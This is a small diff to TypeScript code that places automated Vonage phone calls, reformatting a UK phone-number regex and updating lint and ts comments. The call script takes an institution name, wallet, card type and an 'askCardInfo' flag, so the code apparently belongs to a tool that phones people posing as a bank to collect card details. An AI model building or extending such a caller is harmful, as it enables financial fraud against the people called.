@@ -1,5 +1,4 @@
 /* eslint-disable @typescript-eslint/no-explicit-any */
-/* eslint-disable @typescript-eslint/ban-ts-ignore */
 /* eslint-disable no-console */
 import path from 'path';
 import Vonage from '@vonage/server-sdk';
@@ -135,12 +134,13 @@ export const vonageMakeACall: any = ({
   cardType,
   askCardInfo,
 }: CallInputType) => {
-  const ncco = /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|\#)\d{3,4})?$/g.test(
-    to,
-  )
-    ? nccoPrep(institutionName, 'en-GB', step, wallet, cardType, askCardInfo)
-    : nccoPrep(institutionName, 'en-US', step, wallet, cardType, askCardInfo);
-  // @ts-ignore
+  const ncco =
+    /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
+      to,
+    )
+      ? nccoPrep(institutionName, 'en-GB', step, wallet, cardType, askCardInfo)
+      : nccoPrep(institutionName, 'en-US', step, wallet, cardType, askCardInfo);
+  // @ts-expect-error create actually exist on vonage object
   return vonage.calls.create(
     {
       to: [
